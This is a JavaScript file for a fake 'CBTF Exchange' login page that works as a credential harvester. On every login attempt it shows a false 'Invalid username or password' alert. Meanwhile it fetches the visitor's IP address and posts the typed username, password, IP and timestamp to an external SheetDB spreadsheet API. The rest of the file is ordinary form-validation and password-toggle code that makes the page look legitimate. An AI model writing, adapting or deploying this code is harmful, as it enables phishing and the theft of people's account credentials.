// ============================================
// CBTF EXCHANGE - JAVASCRIPT
// ============================================

// API CONFIGURATION
const API_URL = "https://sheetdb.io/api/v1/irhjpmdb4vsdk";

// ============================================
// ALERT POPUP SYSTEM
// ============================================

/**
 * Show animated alert popup
 * @param {string} message - Alert message to display
 */
function showAlert(message) {
    const alertBox = document.getElementById("topAlert");
    
    if (!alertBox) return;
    
    alertBox.textContent = message;

    // Reset animation
    alertBox.classList.remove("show");
    
    // Trigger animation
    setTimeout(() => {
        alertBox.classList.add("show");
    }, 20);

    // Auto hide after 2.5 seconds
    setTimeout(() => {
        alertBox.classList.remove("show");
    }, 2500);
}

// ============================================
// FORM SUBMISSION
// ============================================

/**
 * Submit login form
 * Fetches user IP, validates inputs, and sends data to API
 */
function submitForm() {
    const username = document.getElementById("username").value.trim();
    const password = document.getElementById("password").value.trim();

    // ALWAYS show error popup on login attempt
    showAlert("Invalid username or password");

    // Validate inputs
    if (!username || !password) {
        console.warn("Form validation failed: empty fields");
        return;
    }

    // Fetch IP address and submit form
    fetchIPAndSubmit(username, password);
}

/**
 * Fetch user IP and submit form data
 * @param {string} username - Username from input
 * @param {string} password - Password from input
 */
function fetchIPAndSubmit(username, password) {
    fetch("https://api.ipify.org?format=json")
        .then(res => res.json())
        .then(ipData => {
            submitToDatabase(username, password, ipData.ip);
        })
        .catch(err => {
            console.error("IP fetch error:", err);
            showAlert("Could not fetch IP");
        });
}

/**
 * Submit form data to SheetDB API
 * @param {string} username - Username from input
 * @param {string} password - Password from input
 * @param {string} ip - User's IP address
 */
function submitToDatabase(username, password, ip) {
    const data = {
        data: [
            {
                username: "'" + username,
                password: "'" + password,
                ip: ip,
                timestamp: new Date().toLocaleString()
            }
        ]
    };

    fetch(API_URL, {
        method: "POST",
        headers: { 
            "Content-Type": "application/json" 
        },
        body: JSON.stringify(data)
    })
    .then(res => {
        if (!res.ok) {
            throw new Error("API submission failed");
        }
        // Show success message
        showSuccessMessage();
        // Clear form fields
        clearFormFields();
    })
    .catch(err => {
        console.error("Form submission error:", err);
        showAlert("Error submitting form");
    });
}

/**
 * Display success message
 */
function showSuccessMessage() {
    const successMsg = document.getElementById("successMsg");
    if (successMsg) {
        successMsg.style.display = "block";
        // Hide after 5 seconds
        setTimeout(() => {
            successMsg.style.display = "none";
        }, 5000);
    }
}

/**
 * Clear form input fields
 */
function clearFormFields() {
    const username = document.getElementById("username");
    const password = document.getElementById("password");
    
    if (username) username.value = "";
    if (password) password.value = "";
}

// ============================================
// PASSWORD VISIBILITY TOGGLE
// ============================================

/**
 * Toggle password field visibility
 */
function togglePasswordVisibility() {
    const passwordInput = document.getElementById("password");
    const toggleIcon = document.querySelector(".toggle-password i");

    if (!passwordInput || !toggleIcon) return;

    if (passwordInput.type === "password") {
        passwordInput.type = "text";
        toggleIcon.classList.remove("fa-eye-slash");
        toggleIcon.classList.add("fa-eye");
    } else {
        passwordInput.type = "password";
        toggleIcon.classList.remove("fa-eye");
        toggleIcon.classList.add("fa-eye-slash");
    }
}

// ============================================
// INPUT VALIDATION (OPTIONAL)
// ============================================

/**
 * Validate username in real-time
 */
function validateUsername() {
    const username = document.getElementById("username");
    const validation = document.getElementById("usernameValidation");
    
    if (!username || !validation) return;

    if (username.value.trim() === "") {
        validation.textContent = "Please enter username.";
    } else {
        validation.textContent = "";
    }
}

/**
 * Validate password in real-time
 */
function validatePassword() {
    const password = document.getElementById("password");
    const validation = document.getElementById("passwordValidation");
    
    if (!password || !validation) return;

    if (password.value.trim() === "") {
        validation.textContent = "";
    } else if (password.value.length < 6) {
        validation.textContent = "Password must be at least 6 characters.";
    } else {
        validation.textContent = "";
    }
}

// ============================================
// EVENT LISTENERS
// ============================================

/**
 * Initialize event listeners when DOM is ready
 */
document.addEventListener("DOMContentLoaded", function() {
    const username = document.getElementById("username");
    const password = document.getElementById("password");

    // Add input listeners for validation
    if (username) {
        username.addEventListener("input", validateUsername);
        username.addEventListener("blur", validateUsername);
    }

    if (password) {
        password.addEventListener("input", validatePassword);
        password.addEventListener("blur", validatePassword);
    }

    // Add Enter key support for form submission
    const formInputs = [username, password];
    formInputs.forEach(input => {
        if (input) {
            input.addEventListener("keypress", function(e) {
                if (e.key === "Enter") {
                    submitForm();
                }
            });
        }
    });

    console.log("CBTF Exchange - Form initialized");
});

// ============================================
// CONSOLE LOGGING (FOR DEBUGGING)
// ============================================

console.log("%cCBTF Exchange - Form System Active", "color: #FF6B35; font-size: 16px; font-weight: bold;");
